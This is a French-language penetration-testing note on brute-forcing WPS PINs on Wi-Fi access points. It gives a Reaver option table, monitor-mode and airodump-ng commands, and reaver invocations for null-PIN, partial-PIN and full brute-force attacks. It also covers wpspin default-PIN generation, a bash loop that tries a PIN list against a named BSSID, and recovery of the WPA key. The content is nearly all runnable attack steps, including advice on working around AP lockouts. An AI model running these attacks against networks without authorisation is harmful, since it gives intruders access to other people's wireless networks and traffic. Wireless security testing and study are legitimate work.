

> [!ATTENTION]
> Les AP récents autorisent 3 tentatives au début puis lock 60 secondes après chaque nouvelle tentative, puis lock de 365 jours au bout de 10 tentatives).
> Reaver nous en informe avec un [!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking.
> Dans ce cas tester tout de même quelques tentative, puis si sans succès -> utiliser un Algo de generation de PIN.


https://github.com/t6x/reaver-wps-fork-t6x

```usage
reaver -i [interface] -b [BSSID] -c [channel]
```

|**Option**|**Description**|
|---|---|
|`-i`|Name of the monitor-mode interface to use|
|`-b`|BSSID of the target AP|
|`-c`|Set the 802.11 channel for the interface|
|`-p`|Use the specified pin|
|`-d`|Set the delay between pin attempts|
|`-l`|Set the time to wait if the AP locks WPS pin attempts|
|`-g`|Quit after num pin attempts|
|`-r`|Sleep for y seconds every x pin attempts|
|`-t`|Set the receive timeout period|
|`-L`|Ignore locked state reported by the target AP|
|`-K, -Z`|Run pixiedust attack|
|`-O`|Write packets of interest into pcap file|

## 1. Passer en mode monitor

> [!WARNING]
> Important de ne pas utiliser airmon-ng du à un bug

```shell-session
sudo iw dev wlan0 interface add mon0 type monitor
```

```shell-session
sudo ifconfig mon0 up
```

```shell-session
iwconfig
```

## 2. Scan WPS networks

Capturer le trafic et afficher les information WPS

```shell-session
sudo airodump-ng --wps --ignore-negative-one mon0
```

## 3. Bruteforce Online


Null PIN

```shell-session
sudo reaver -b 5A:1A:59:B7:E7:97 -c 1 -i mon0 -p " " -v
```

En ayant connaissance de la première moitié du PIN

```shell-session
sudo reaver -i mon0 -b B2:A5:1D:E1:B2:11 -c 1 -p 1234 -v
```

Bruteforce complet

```shell-session
sudo reaver -i mon0 -b <bssid> -c <channel> -v
```


### Vendor lookup


Prendre les 3 premiers octets de l'adresse MAC de l'AP et possible de checker dans /var/lib/ieee-data/oui.txt ou bien sur https://standards-oui.ieee.org/oui/oui.txt


```shell-session
grep -i "9C-C9-EB" /var/lib/ieee-data/oui.txt
```


### Générer des default WPS Pin

https://github.com/drygdryg/wpspin

WPSPin -> genère de potentiels pin en sa basant sur l'adresse MAC du routeur

Install

```shell-session
git clone https://github.com/drygdryg/wpspin.git
cd wpspin
sudo python setup.py install
```

Générer 1 PIN

```shell-session
wpspin D4:BF:7F:EB:29:D2
```

Générer plusieurs PIN

```shell-session
wpspin -A D4:BF:7F:EB:29:D2
```

Générer plusieurs PIN et formater la sortie

```shell-session
wpspin -A 60:38:E0:A2:3D:2A | grep -Eo '\b[0-9]{8}\b' | tr '\n' ' '
```

Puis bruteforce avec reaver pour chaque PIN

```bash
#!/bin/bash

#We add generated PINs into this list
PINS='73834410 94229882 73834410 06490959 11184812 63311501 11184812 36499373 63313604 99956042 95661469 89478486 11184812 11184812 95755212 20854836 20144326 33946153 13142452 74163052 51875350 43977680 56587340 95719115 48563710 92148659 05294176 89532331 68175542 71412252 80652847 76229909 46264848 82799427 20233921 31957199 10864111 62327145 30432031 90970948 22369628 33554433 34259283 35611530 20172527 67958146 12345670 74244973'

for PIN in $PINS
do
    echo Attempting PIN: $PIN
    sudo reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b 60:38:E0:A2:3D:2A -c 1 -p $PIN
done
echo "PIN Guesses Complete"
```

Voir également [[3. Générateurs de PIN]]


## 4. Récupérer la clé WPA à partir du PIN

Une fois le PIN récupéré, possible de récupérer la clé WPA

```shell-session
sudo reaver -i mon0 -b 60:38:E0:2A:4F:21 -p <PIN> -v
```